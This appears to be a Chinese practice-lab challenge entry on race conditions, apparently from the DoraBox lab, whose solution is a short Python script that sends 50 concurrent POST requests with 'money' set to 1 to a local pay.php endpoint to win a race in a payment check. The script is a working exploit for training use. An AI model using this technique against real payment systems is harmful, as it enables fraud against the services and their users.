# 题目：条件竞争

### 题目描述：[练习]条件竞争

### 题目难度： 🌟

### 维护：le31ei

### KEY: `无`

### 配置信息： 
1. 开放端口： `8083`

### 解题过程：
```python 
import requests
import threading
import Queue

url = "http://127.0.0.1/DoraBox/race_condition/pay.php"
threads = 25
q = Queue.Queue()

for i in range(50):
    q.put(i)

def post():
    while not q.empty():
        q.get()
        r = requests.post(url, data={'money': 1})
        print(r.text)

if __name__ == '__main__':
    for i in range(threads):
        t = threading.Thread(target=post)
        t.start()

    for i in range(threads):
        t.join() 

```